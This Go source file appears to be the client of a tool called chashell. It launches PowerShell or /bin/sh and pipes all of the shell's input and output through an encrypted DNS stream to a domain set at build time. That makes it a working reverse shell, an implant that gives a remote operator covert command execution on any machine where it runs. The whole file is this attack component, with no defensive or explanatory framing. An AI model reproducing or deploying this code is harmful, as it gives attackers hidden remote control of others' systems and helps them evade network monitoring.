package main

import (
	"chashell/lib/transport"
	"os/exec"
	"runtime"
)

var (
	targetDomain  string
	encryptionKey string
)

func main() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
	}

	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)

	cmd.Stdout = dnsTransport
	cmd.Stderr = dnsTransport
	cmd.Stdin = dnsTransport
	cmd.Run()
}

